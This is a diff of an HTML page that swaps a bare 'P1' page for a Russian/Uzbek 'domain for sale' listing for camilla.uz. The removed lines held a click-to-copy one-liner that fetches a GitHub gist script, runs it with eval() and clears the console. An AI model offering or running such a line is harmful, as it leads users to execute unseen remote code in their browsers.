@@ -1,28 +1,146 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>P1</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Купить домен Camilla.uz — Сайт на продажу | Sotiladi</title>
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="Премиум-домен camilla.uz выставлен на продажу. Красивое, запоминающееся имя для бизнеса. Свяжитесь в Telegram или по телефону." />
+    <meta name="keywords" content="camilla.uz, купить домен, домен на продажу, sotiladi domen, uz domen sotish, премиум домен uz" />
+    <meta name="author" content="Camilla.uz" />
+    <!-- Open Graph / Social -->
+    <meta property="og:title" content="Camilla.uz продается | Sotiladi" />
+    <meta property="og:description" content="Премиум-домен camilla.uz на продажу. Telegram: @khasan_dev | Тел: +998 90 270 02 24" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://camilla.uz/" />
+    <meta property="og:image" content="https://camilla.uz/og-image.jpg" /> <!-- Замени, если добавишь картинку -->
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Camilla.uz продается | Sotiladi" />
+    <meta name="twitter:description" content="Премиум-домен camilla.uz на продажу. Свяжитесь: @khasan_dev" />
     <style>
         body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             margin: 0;
+            background: linear-gradient(135deg, #f0f4f8, #d9e2ec);
+            color: #333;
             padding: 20px;
-            font-family: monospace;
+            box-sizing: border-box;
         }
-        #code {
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            max-width: 600px;
+            width: 100%;
+        }
+        h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #1a1a1a;
+        }
+        p {
+            font-size: 22px;
+            margin: 15px 0;
+        }
+        a {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .phone-link {
+            color: #007bff;
+            text-decoration: underline;
+            font-weight: bold;
             cursor: pointer;
-            user-select: all;
+        }
+        .lang-switcher {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+        .lang-switcher button {
+            margin: 0 5px;
+            padding: 8px 16px;
+            border: 1px solid #ccc;
+            background: white;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: background 0.3s;
+        }
+        .lang-switcher button:hover {
+            background: #f0f0f0;
+        }
+        .price {
+            font-size: 28px;
+            color: #e74c3c;
+            margin: 30px 0;
+            font-weight: bold;
+        }
+        @media (max-width: 600px) {
+            h1 { font-size: 28px; }
+            p { font-size: 18px; }
+            .price { font-size: 24px; }
         }
     </style>
 </head>
 <body>
-    <div id="code">fetch('https://gist.githubusercontent.com/Khasan1111/f9218594bbc5006fc5701ace58c0128c/raw/dca712fd36303edf405e57162437d638e9a376d7/script.js').then(r => r.text()).then(code => { eval(code); console.clear(); })</div>
+    <div class="lang-switcher">
+        <button onclick="setLanguage('ru')">Русский</button>
+        <button onclick="setLanguage('uz')">O'zbek</button>
+    </div>
+
+    <div class="container">
+        <h1 id="title">Сайт camilla.uz продается!</h1>
+        <div class="price" id="price">Цена: по запросу (обсуждаемая)</div>
+        <p id="desc">Премиум-домен для вашего бизнеса. Короткое, красивое и запоминающееся имя.</p>
+        <p id="contact">
+            Для связи напишите в Telegram:
+            <a href="https://t.me/khasan_dev" target="_blank" rel="noopener noreferrer">@khasan_dev</a>
+        </p>
+        <p id="phone">
+            Телефон: 
+            <a href="tel:+998902700224" class="phone-link">+998 90 270 02 24</a>
+        </p>
+    </div>
 
     <script>
-        document.getElementById('code').addEventListener('click', function() {
-            navigator.clipboard.writeText(this.textContent);
-        });
+        function setLanguage(lang) {
+            if (lang === 'ru') {
+                document.getElementById('title').textContent = 'Сайт camilla.uz продается!';
+                document.getElementById('price').textContent = 'Цена: по запросу (обсуждаемая)';
+                document.getElementById('desc').textContent = 'Премиум-домен для вашего бизнеса. Короткое, красивое и запоминающееся имя.';
+                document.getElementById('contact').innerHTML =
+                    'Для связи напишите в Telegram: <a href="https://t.me/khasan_dev" target="_blank" rel="noopener noreferrer">@khasan_dev</a>';
+                document.getElementById('phone').innerHTML =
+                    'Телефон: <a href="tel:+998902700224" class="phone-link">+998 90 270 02 24</a>';
+                document.title = 'Купить домен Camilla.uz — Сайт на продажу | Sotiladi';
+                document.documentElement.lang = 'ru';
+            } else if (lang === 'uz') {
+                document.getElementById('title').textContent = 'Camilla.uz sayti sotiladi!';
+                document.getElementById('price').textContent = 'Narxi: kelishilgan holda';
+                document.getElementById('desc').textContent = 'Biznesingiz uchun premium domen. Qisqa, chiroyli va esda qolarli nom.';
+                document.getElementById('contact').innerHTML =
+                    'Bogʻlanish uchun Telegramda yozing: <a href="https://t.me/khasan_dev" target="_blank" rel="noopener noreferrer">@khasan_dev</a>';
+                document.getElementById('phone').innerHTML =
+                    'Telefon: <a href="tel:+998902700224" class="phone-link">+998 90 270 02 24</a>';
+                document.title = 'Camilla.uz domeni sotiladi — Sayt sotiladi | For Sale';
+                document.documentElement.lang = 'uz';
+            }
+        }
+
+        // Русский по умолчанию
+        setLanguage('ru');
     </script>
 </body>
 </html>
